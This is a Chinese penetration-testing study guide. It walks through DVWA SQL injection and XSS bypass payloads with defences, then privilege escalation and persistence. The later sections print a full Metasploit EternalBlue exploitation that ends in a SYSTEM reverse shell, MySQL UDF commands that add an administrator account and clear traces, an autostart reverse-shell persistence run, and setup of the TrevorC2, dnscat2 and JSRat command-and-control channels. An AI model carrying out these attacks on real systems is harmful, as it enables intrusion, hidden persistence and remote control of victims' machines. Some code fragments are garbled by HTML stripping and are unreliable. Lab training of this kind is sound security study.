#，查询成功，说明存在数字型注入。 针对这里的特殊符号转义，单引号被转义变成了\\'，但是可以将参数转换为16进制进行绕过。例如：table_name='users'变成table_name=0x7573657273 SQL Injection_high级别代码分析 Something went wrong.' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } mysql_close(); } ?> 可以看到，与low级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 SQL Injection_high级别漏洞利用 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。 需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 SQL Injection_impossible级别代码分析&【防御】 prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data->bindParam( ':id', $id, PDO::PARAM_INT ); $data->execute(); $row = $data->fetch(); // Make sure only 1 result is returned if( $data->rowCount() == 1 ) { // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo \"ID: {$id}First name: {$first}Surname: {$last}\"; } } } // Generate Anti-CSRF token generateSessionToken(); ?> 可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为1时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。 SQL注入防御： 过滤用户输入 使用预编译处理SQL语句（PDO 、Sqlparameter） 使用owasp等安全的sql处理API SQL Injection (Blind)盲注 SQL Injection（Blind）介绍 SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。 盲注的分类 基于时间的盲注，注意是否有延迟 输入1 and sleep(5) # 输入1' and sleep(5) # 基于布尔的盲注，注意返回结果是否相同 输入1' and 1=1 # 输入1' and 1=2 # SQL Injection(Blind)_low级别代码分析&漏洞利用 0 ) { // Feedback for end user echo 'User ID exists in the database.'; } else { // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo 'User ID is MISSING from the database.'; } mysql_close(); } ?> 可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种：User ID exists in the database. 与 User ID is MISSING from the database. 当输入1' and 1=1 #时，返回User ID exists in the database.，当输入1' and 1=2 #时，返回User ID is MISSING from the database.，说明存在字符型SQL盲注。 其他级别的盲注漏洞和非盲注漏洞都是只有反馈上的差别，只是High级别的代码中会执行sleep(seconds)函数，目的是为了扰乱基于时间的盲注。而盲注的防御也和前面SQL注入的防御一样，在此不再赘述。 反射型XSS XSS介绍 XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。 DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。 反射型XSS_low级别代码分析 Hello ' . $_GET[ 'name' ] . ''; } ?> 代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。 反射型XSS_low级别漏洞利用 输入alert('xss')，成功弹框。javascript中，alert()是弹出警告框的意思。 反射型XSS_medium级别代码分析 ', '', $_GET[ 'name' ] ); // Feedback for end user echo \"Hello ${name}\"; } ?> 这里基于黑名单用str_resplace函数过滤，采用双写绕过或者大小写绕过，也可以使用其他可以触发XSS的代码，进行轻松绕过的。 反射型XSS_medium级别漏洞利用 双写绕过：ript>alert('XSS') 大小写绕过：alert('XSS') 反射型XSS_hight级别代码分析&漏洞利用 Hello ${name}\"; } ?> High级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式彻底过滤script，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。因此，使用其他代码代替script，例如：（如果图片的src所指的路径不存在图片，则 弹框） 反射型XSS_impossible级别代码分析&【防御】 Hello ${name}\"; } // Generate Anti-CSRF token generateSessionToken(); ?> Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、转换为HTML实体，防止浏览器将其作为HTML元素。 防御： 过滤用户输入 使用htmlspecialchars()过滤 使用owasp等安全xss处理API 存储型XSS 介绍 存储型XSS又称为持久型跨站脚本，比反射型XSS更具威胁性，并且可能影响到Web服务器自身安全。它的代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候将触发代码执行。 存储型XSS_low级别代码分析 ' . mysql_error() . '' ); //mysql_close(); } ?> 可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。存在Name和Message两处XSS，在输入时存在字符长度限制，可以通过修改maxlength进行绕过或者抓包修改进行绕过。 其他级别的存储型XSS也和反射型XSS类似，绕过方法以及防御也相同，因此不再赘述。 DOM型XSS 介绍 DOM型XSS的产生并没有和后台服务器产生交互，而是通过浏览器的DOM树解析产生的。 DOM型XSS_low级别代码分析&漏洞利用 #服务器端没有任何php代码，查看前端页面源代码，处理用户输入的只有前端的js代码： if (document.location.href.indexOf(\"default=\") >= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8); document.write(\"\" + decodeURI(lang) + \"\"); document.write(\"----\"); } document.write(\"English\"); document.write(\"French\"); document.write(\"Spanish\"); document.write(\"German\"); 由于没有对XSS进行防御，可以直接在url后面添加payload，http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=Englishalert()弹框证明有xss的存在，浏览器在解析html dom树时就会触发js弹框代码 。 DOM型XSS_medium级别代码分析 前端代码和low级别一样，但是后端代码对url的default参数的值做了限制 不允许出现script标签，否则就将default的值设为默认的English，stripos函数还防止了大小写绕过。 DOM型XSS_medium级别漏洞利用 可以采用img来代替构造payload，同时要注意进行对标签的闭合： http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English DOM型XSS_high级别代码分析 这里采用了白名单，要求default的值必须为select选择菜单中的值。 DOM型XSS_high级别漏洞利用 可以利用字符#进行绕过，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，payload构造连接为：http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English # alert() DOM型XSS_防御 过滤用户输入 使用htmlspecialchars()过滤 使用owasp等安全xss处理API 客户端浏览器自身启动 XSS Filter Weak Session ID弱会话ID Session ID介绍 密码与证书等认证手段，一般仅仅用于登录的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。 当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。用户拿到SessionID就会加密后保存到 cookies 上，之后只要cookies随着http请求发送服务器，服务器就知道你是谁了。 SessionID一旦在生命周期内被窃取，就等同于账户失窃。同时由于SessionID是用户登录之后才持有的认证凭证，因此不需要进行密码破解。 Weak Session ID_low级别代码分析 从服务端的代码端可以看出，sessionID只是从0开始累加，所以可以较容易的猜测出别人的SessionID。 Weak Session ID_medium级别代码分析 将cookie的值改成了当前的时间，看起来比low的随机了点，但是经过连续的收集后就很容易发现其中的规律。也可以用时间戳转换工具进行转换。 Weak Session ID_high级别代码分析 这里将cookie的值进行了md5加密，并且还设置了cookie过期时间进一步增加SessionID的安全性，但不足的是进行md5加密的值是0的累加。也可以用解密网站进行md5解密。 Weak Session ID_impossible级别代码分析&【防御】 这里将cookie值 = sha1(随机数+时间戳+固定字符串“impossbile”)，用了sha1()函数对cookie进行了加密，从而降低了被破解的可能性。 第八阶段-权限提升 提权基础 服务器配置（apache2为例） 提权本质 提权本质就是提升自己在服务器中的权限，获得更大的权限。 例如：在Windows下普通用户，通过提权获得Administrator或system权限；在Linux中通过执行编译后的程序，从普通用户权限提升到roo账号权限。 提权分类 提权分为本地提权和远程提权；也可以分为系统提权和第三方软件提权 权限配置 一般情况下，Web服务会给与一个特定低权限用户维护服务，避免给与过高权限。 Windows系统提权基础命令 ipconfig /all 查看网卡、ip、DNS、DHCP等信息 netstat -an 获取当前主机所有端口的开放情况及网络连接情况 net start 命令查看系统所开启的所有服务 net stop 服务名称 关闭服务，如杀毒软件 tasklist /svc 获取运行的进程名称、服务和PID taskkill /PID 号码 结束进程，taskkill /? 获取帮助信息 net user username password /add 添加用户 net localgroup administrators username /add 添加用户到管理员组 Windows提权辅助工具 辅助工具介绍 Windows-Exploit-Suggester 此工具将目标补丁与Microsoft漏洞数据库进行比较，以检测目标上潜在的缺失补丁。https://github.com/GDSSecurity/Windows-Exploit-Suggester/ 辅助工具安装 环境：python2.7、安装xlrd模块。python -m pip install xlrd 执行 --update以获取漏洞文件。会这当前目录下创建一个*mssb.xls文件 辅助工具命令行介绍 使用-h参数获取帮助信息 辅助工具使用技巧 查看本机补丁与漏洞文件中，可能存在的POC。 实操： >python windows-exploit-suggester.py --update [*] initiating winsploit version 3.3... [+] writing to file 2020-04-14-mssb.xls [*] done >systeminfo > win2003.txt >python windows-exploit-suggester.py --audit -i win2003.txt -d 2020-04-14-mssb.xls [*] initiating winsploit version 3.3... [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file ... 8-4Windows远程提权（以ms17-010为例） 远程提权 在授权的情况下，针对目标机器进行渗透测试，需要对目标进行提权。可以首先扫描系统是否存在可利用漏洞，探测是否可以利用。 如果可以直接利用获得最高权限，那么就不需要本地提权，直接远程提权拿到最高权限。 ms17-010介绍 MS17-010是一个安全类型的补丁，MS17-010更新修复了Microsoft Windows中的漏洞。 如果攻击者向 Microsoft 服务器消息块 1.0 (SMBv1) 服务器发送经特殊设计的消息，则其中最严重的漏洞可能允许远程代码执行。 WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播 。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。 勒索病毒是自熊猫烧香以来影响力最大的病毒之一。 扫描探测ms17-010漏洞 在metasploit下直接利用ms17-010的漏洞扫描模块进行探测。 利用ms17-010漏洞提权 在Metasploit下集成了ms17-010的漏洞利用模块 。 实操 #扫描探测ms17-010漏洞 root@kali:~# msfconsole msf5 > search ms17-010 msf5 > use auxiliary/scanner/smb/smb_ms17_010 msf5 auxiliary(scanner/smb/smb_ms17_010) > show options msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.177.134 msf5 auxiliary(scanner/smb/smb_ms17_010) > run [+] 192.168.177.134:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit) [*] 192.168.177.134:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed #以上探测结果表明靶机存在ms17-010漏洞 #下面开始利用ms17-010漏洞提权 msf5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) > show options msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf5 exploit(windows/smb/ms17_010_eternalblue) > show options msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.177.134 msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.177.128 msf5 exploit(windows/smb/ms17_010_eternalblue) > show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.177.134 yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.177.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit [*] Started reverse TCP handler on 192.168.177.128:4444 [+] 192.168.177.134:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit) [*] 192.168.177.134:445 - Connecting to target for exploitation. [+] 192.168.177.134:445 - Connection established for exploitation. [+] 192.168.177.134:445 - Target OS selected valid for OS indicated by SMB reply [*] 192.168.177.134:445 - CORE raw buffer dump (23 bytes) [*] 192.168.177.134:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61 Windows 7 Ultima [*] 192.168.177.134:445 - 0x00000010 74 65 20 37 36 30 30 te 7600 [+] 192.168.177.134:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 192.168.177.134:445 - Trying exploit with 12 Groom Allocations. [*] 192.168.177.134:445 - Sending all but last fragment of exploit packet [*] 192.168.177.134:445 - Starting non-paged pool grooming [+] 192.168.177.134:445 - Sending SMBv2 buffers [+] 192.168.177.134:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 192.168.177.134:445 - Sending final SMBv2 buffers. [*] 192.168.177.134:445 - Sending last fragment of exploit packet! [*] 192.168.177.134:445 - Receiving response from exploit packet [+] 192.168.177.134:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 192.168.177.134:445 - Sending egg to corrupted connection. [*] 192.168.177.134:445 - Triggering free of corrupted buffer. [*] Sending stage (206403 bytes) to 192.168.177.134 [*] Meterpreter session 2 opened (192.168.177.128:4444 -> 192.168.177.134:52582) at 2020-04-15 23:14:27 +0800 [+] 192.168.177.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 192.168.177.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 192.168.177.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= meterpreter > shell Process 3736 created. Channel 1 created. Microsoft Windows [�汾 6.1.7600] ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ���� C:\\Windows\\system32>whoami whoami nt authority\\system C:\\Windows\\system32> #成功利用ms17-010漏洞 MySQL UDF提权 UDF介绍 UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。 在提权过程中，经常使用mysql 的udf.dll进行提权。并且提权之前，要上传udf.dll到指定的目录下。 使用select @@plugin_dir;或show variables like 'plugin%';查看具体目录。 MySQL 5.0 MySQL>5.1，必须要把udf.dll文件放到MySQL安装目录下的lib\\plugin文件夹下才能创建自定义函数。）； 修改目录方式： mysqld.exe --plugin-dir=具体目录 mysqld.exe --defaults-file=具体目录 mysql.ini配置文件 plugin_dir=具体目录 udf.dll获取 sqlmap下自带了对应提权使用的udf库。可以直接下载使用，但是sqlmap进行加密，需要解密。 在D:\\SQLmap\\extra\\cloak目录下执行命令python cloak.py -d -i D:\\SQLmap\\data\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll_生成udf.dll（注意系统位数） 上传UDF 将udf.dll文件上传到指定目录下。select @@plugin_dir;或show variables like 'plugin%'; 利用sql注入进行上传select load_file() into dumpfile “具体路径” 直接利用蚁剑上传到具体目录下。（一般Lib、Plugin文件夹需要手工建立；还有要重命名文件） 执行提权命令 #从udf.dll文件中引入自定义函数sys_eval create function sys_eval returns string soname 'udf.dll'; #判断是否成功创建自定义函数 select * from mysql.func where name = 'sys_eval'; #运行dir命令验证自定义函数是否正常运行 select sys_eval('dir'); #新建密码为123的用户user1 select sys_eval('net user user1 123 /add'); #将用户user1添加到administrators组 select sys_eval('net localgroup administrators user1 /add'); #清除痕迹 drop function sys_eval; 第九阶段-权限维持 权限维持介绍 权限维持的原因 某目标服务器初始化现阶段存在安全漏洞，可以被利用拿到服务器权限。一段时间后，系统管理员对系统进行升级，打补丁（patch），系统不存在安全漏洞，导致无法利用漏洞获得服务器权限。 合法且被授权的渗透测试人员，利用权限维持为了证明服务器存在对应的安全漏洞。 权限维持案例-环境介绍 目标机器：win7 没有ms17-010补丁。 利用Metasploit中ms17-010对应的Exploit可以进行渗透测试，获取”临时”的System权限。（当补丁打上就不能利用ms17-010获取System权限）。 权限维持案例 使用Metasploit run persistence模块run persistence -U -i 10 -p 4444 -r 192.168.177.128 -S：系统启动时加载； -X：开机时自动加载； -U：用户登录时加载。该方式会在HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run下添加注册表信息。推荐使用该参数； -i：设置反向连接间隔时间，单位为秒； -p：设置反向连接的端口号（攻击机）； -r：设置反向连接的ip地址（攻击机）。 #实操 meterpreter > run persistence -X -i 5 -p 1234 -r 192.168.177.128 [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe. [!] Example: run post/windows/manage/persistence_exe OPTION=value [...] [*] Running Persistence Script [*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-AUH1U25K717_20200418.3452/WIN-AUH1U25K717_20200418.3452.rc [*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.177.128 LPORT=1234 [*] Persistent agent script is 99643 bytes long [+] Persistent Script written to C:\\Windows\\TEMP\\yPUGtWnZGTYBV.vbs [*] Executing script C:\\Windows\\TEMP\\yPUGtWnZGTYBV.vbs [+] Agent executed with PID 2996 [*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\wbKiWQgLFSGi [+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\wbKiWQgLFSGi #以上在靶机上创建了开机自启的反弹shell #下面用metasploit连接前面创建的shell msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set lhost 192.168.177.128 lhost => 192.168.177.128 msf5 exploit(multi/handler) > set lport 1234 lport => 1234 msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.177.128:1234 [*] Sending stage (179779 bytes) to 192.168.177.134 [*] Meterpreter session 1 opened (192.168.177.128:1234 -> 192.168.177.134:49187) at 2020-04-18 23:38:01 +0800 meterpreter > 权限维持 - TrevorC2工具 TrevorC2工具介绍 TrevorC2是基于C/S架构的通过浏览网站，进行命令控制。由于时间间隔不同且不使用POST请求进行数据提交，因此检测TrevorC2变得困难很多，这样更加隐蔽，不容易被察觉。 TrevorC2有两个组件一客户机和服务器。目前trevorc2_client.py支持Windows、MacOS和Linux。 组成： trevorc2_server.py trevorc2_client.py TrevorC2工具安装 git clone https://github.com/trustedsec/trevorc2.git pip install -r requirements.txt TrevorC2工具使用 ./trevorc2_server.py 启动TrevorC2服务端（攻击机） gedit trevorc2_client.py 修改TrevorC2客户端IP设置 python trevorc2_client.py 启动TrevorC2客户端（靶机） TrevorC2建立连接 list 查看建立的会话 interact 会话ID 连接会话 权限维持 - Dnscat2工具 Dnscat2工具介绍 dnscat2是基于C/S架构的一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道，它的一大特色就是服务端会有一个命令行控制台，所有的指令都可以在该控制台内完成。包括：文件上传、下载、反弹Shell等等。 服务端用来建立监听，等待连接。可以说是一个用来建立DNS服务端的程序。 Dnscat2工具安装 服务端安装：（攻击机） git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server/ gem install bundler bundler install 客户端安装：（靶机） git clone https://github.com/iagox86/dnscat2.git cd dnscat2/client/ make Dnscat2工具使用 服务端 ruby dnscat.rb 客户端 /dnscat2 --dns server=127.0.0.1,port=53 Dnscat2建立连接 session #查看已建立的连接 session -i 1 #对会话进行连接 ping #测试连接情况 shell #建立反弹shell ctrl-z #按键Ctrl+Z退出当前会话 session -i 2 #连接反弹shell 权限维持 - JsRAT工具 JsRAT工具介绍 JsRAT工具是用来建立以HTTP协议为基础的命令控制通道。 JsRAT是一款使用Python脚本开发的工具，利用JS反弹shell，并不会在硬盘安装任何程序，避免被发现。 JsRAT工具安装 git clonehttps://github.com/Hood3dRob1n/JSRat-Py.git JsRAT工具使用 ./JSRat.py -i IP地址 -p 端口 使用客户端浏览器访问以上IP和端口，以获得执行命令 JsRAT建立连接 在命令行中执行浏览器中显示的命令。 在攻击机中获得反弹shell end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 10:43 "},"第二阶段-Web安全篇/BurpSuite学习使用.html":{"url":"第二阶段-Web安全篇/BurpSuite学习使用.html","title":"BurpSuite学习使用","keywords":"","body":"BurpSuite学习使用 BurpSuite工具全解析 BurpSuite安装&配置 介绍：BurpSuite是一款用JAVA语言编写的跨平台软件，用于攻击web应用程序的集成平台，包含了许多工具。BurpSuite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。 配置环境：下载并安装JRE JDK是java开发工具包，是程序员使用java语言编写java程序所需的开发工具包，是提供给程序员使用的。JRE是java运行时环境，包含了java虚拟机，java基础类库。是使用java语言编写的程序运行所需要的软件环境，是提供给想运行java程序的用户使用的。而JDK包含了JRE。 安装：直接在官网上下载社区版即可满足使用。 在浏览器中安装BurpSuite CA证书 配置浏览器代理： 配置BurpSuite代理：（一般默认即可） BurpSuite Proxy（代理）模块 Proxy模块是BurpSuite以用户驱动测试流程功能的核心，通过代理模式，可以让我们拦截、查看、修改所有在客户端和服务端之间传输的数据。 Intercept（截断）部分： Forward表示将截断的HTTP或HTTPS请求发送到服务器。 Drop表示将截断的HTTP或HTTPS请求丢弃。 Intercept is on 和 Intercept is off 表示开启或关闭代理截断功能。 Action表示将代理截断的HTTP或HTTPS请求发送到其他模块或做其他处理。 对Intercept进行Raw、Params、Header、Hex切换查看不同的数据格式。 HTTP history部分 HTTP history用来查看提交过的HTTP请求。 Filter可以过滤显示某些HTTP请求。点击Filter就可以打开。对于指定URL可以选中右键点击，执行其他操作。WebSockets hIstory与HTTP history功能类似。 Options部分 Options具有的功能：代理监听设置、截断客户端请求、截断服务器响应、截断WebSocket通信、服务端响应修改（绕过JS验证文件上传）、匹配与替换HTTP消息中的内容、通过SSL连接Web服务器配置、其他配置选项。 设置 Proxy Listener（代理监听器） 通过设置Proxy Listeners来截断数据流量。比如设置监听端口等。 设置 Intercept Client Requests（拦截客户端请求） 通过设置Intercept Client Requests来截断符合条件的HTTP请求。 设置 Intercept Server Response（服务器响应拦截） 通过设置Intercept Server Response来筛选出符合条件的HTTP响应。 设置拦截Websockets信息以及Response Modification（响应操作）的内容 设置 Match and Replace 可以修改和替换HTTP请求和HTTP响应中的内容。 设置 SSL Pass Through 设置使用Burp直接通过SSL直连到目标服务器。 其他设置Miscellaneous BurpSuite截断WebAPP流量 WebAPP介绍 目前WebApp(手机App)的通信任然使用HTTP协议进行对应的通信。可以通过Burp设置代理，然后手机设置网络代理，通过Burp截断手机APP流量。 手机网络设置 在手机网络设置中，填写对应的代理 BurpSuite截断手机APP流量 BurpSuite剔除JS脚本（绕过JS文件上传验证） JavaScript介绍 JavaScript一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML网页上使用，用来给HTML网页增加动态功能。 例如：对于文件上传的JS验证 BurpSuite截断响应剔除JavaScript脚本 在Proxy模块中的Option下Response Modification，可以勾选Remove all JavaScript剔除JavaScript脚本。 浏览器审计工具进行手动剔除JavaScript脚本 F12手动剔除 BurpSuite Target（目标）模块 Target介绍 Target模块主要包含site map（站点地图）、scope（作用域）、issue definition（问题定义）三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息。 Target Scope介绍 作用域的定义比较宽泛，通常来说，当我们对某个产品进行渗透测试时，可以通过域名或者主机名去限制拦截内容，这里域名或主机名就是我们说的作用域；如果我们想限制得更为细粒度化，比如，你只想拦截login目录下的所有请求，这时我们也可以在此设置，此时，作用域就是目录。 Target Site Map介绍 的左边为访问的URL，按照网站的层级和深度，树形展示整个应用系统的结构和关联其他域的url情况；右边显示的是某一个url被访问的明细列表，共访问哪些url，请求和应答内容分别是什么，都有着详实的记录。 基于左边的树形结构，我们可以选择某个分支，对指定的路径进行扫描和抓取。 Target Site Map分析 通过对站点地图 Sitemap进行分析，分析其中页面的提交参数等。 对于同一Web系统，不登录与登录系统是具有不同的响应的。针对这样的情况可以使用Burpsuite中Sitemap比较两者的区别。 Burpsuite Dashboard（仪表盘）模块 Burp 1.x具有的Spider和Scanner模块被集合到了Burp 2.x中的Dashboard模块中。 Dashboard介绍 Dashboard分为三部分：Tasks（任务）、Event log（事件日志）、issue activity（动态发现的问题）。 Tasks部分 Tasks 中自带了两个模版，相当于以前版本的spider 和scanner 模块的结合体，支持自定义创建。 live passive crawl from proxy(all traffic) #（来自代理（所有流量）的被动抓取） live audit from proxy(all traffic) # （来自代理（所有流量）的实时审计） Event log：这个主要是BurpSuite出现问题或异常状况查看日志用。 BurpSuite Intruder（入侵）模块 Intruder介绍 在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个payload，在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。 使用场景 标识符枚举Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。 提取有用的数据在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符 提取一些其他的数据。 模糊测试很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。 使用步骤 设置代理，开启Burpsuite截断需要测试的请求。 将截断的请求发送到Burpsuite Intruder，设置Payload测试。 筛选Intruder结果，选取有用信息。 Intruder Positions部分 攻击模式选择 Sniper（狙击手） 需要字典：1个【payload set部分只能选择1】 变量数量：不限 加载顺序：将字典依次填入所有变量中。 Battering ram（攻城槌） 需要字典：1个【payload set部分只能选择1】 变量数量：不限 加载顺序：将字典同时填入所有变量中 Pitchfork（草叉） 需要字典：N个【payload set可以选择N个】 变量数量：N个【需要和字典数量相同】 加载顺序：字典和变量分别对应，同时填入对应变量中；且字典1中的payload与字典2中的payload为映射关系。 Cluster bomb（集束炸弹） 需要字典：N个【payload set可以选择N个】 变量数量：N个【需要和字典数量相同】 加载顺序：字典和变量分别对应，分别填入对应变量中；且字典1中的payload与字典2中的payload为笛卡尔积的关系。 突然发现有份burpsuite文档还没有看......里面的内容比我做的笔记还详细.......那我还做这笔记干嘛[哭笑] end. BurpSuite原理到实战 攻击身份验证系统 身份验证是应用程序防御恶意攻击的核心。它是防止未经授权访问的第一线。如果攻击者可以绕过防御措施，他通常会完全控制应用程序的功能，并可以不受限制地访问其中的数据。如果没有强大的身份验证依赖，其他核心安全机制（例如会话管理和访问控制）都不会有效。 身份验证如今复杂多样，有传统的登陆，也有双因素（2FA）认证【常用的双因素组合是密码 + 某种个人物品，如银行卡+密码】，还有单点登陆（SSO）【当用户在身份认证服务器上登录一次以后，即可获得访问单点登录系统中其他关联系统和应用软件的权限】，0Auth2.0认证【第三方应用认证】。如图就是传统登陆的情况，而针对不同的认证模式，利用Burpsuite进行测试的方式也是不同的，这次就只针对传统登陆的情况。 SQL时间盲注 基于时间的盲注是实际漏洞挖掘场景中最为常用的一个注入手段，因为相比于报错注入或者是布尔盲注，针对基于时间盲注的防御措施十分稀少，较多的开发人员专注于页面的输出控制而忽略了基于时间盲注这种无需关注输出的内容而是针对输出过程做判断的手段。 sleep()或benchmark()函数，sleep(5);延迟5s，benchmark(1e8,11);执行10^8次1\\1达到延迟。 绕过前端控件限制 比如你在电商平台购物的时候，各种购买条件都是被限制住的，比如数量只能填写数字，收件人的手机号必须符合手机号码的格式，如果不这么做，那页面就会发出提示的信息，告诉你现在的操作是不被允许的，在大部分情况下，都是通过前端JS来校验用户的输入，从而判断出操作是否规范，这就是前端JS验证。 隐藏表单最直观的体现就是，在最后支付的时候，客户仅仅只需要点击一个确认按钮，后台就能知道你要买的东西是什么，需要付多少钱，而不需要用户一个框一个框的填写金额，数量，商品名等等，这都是因为在用户点击确认按钮后，发送的http请求往往是携带更多参数的，这些都是被隐藏在表单之中杜绝被用户任意篡改的。 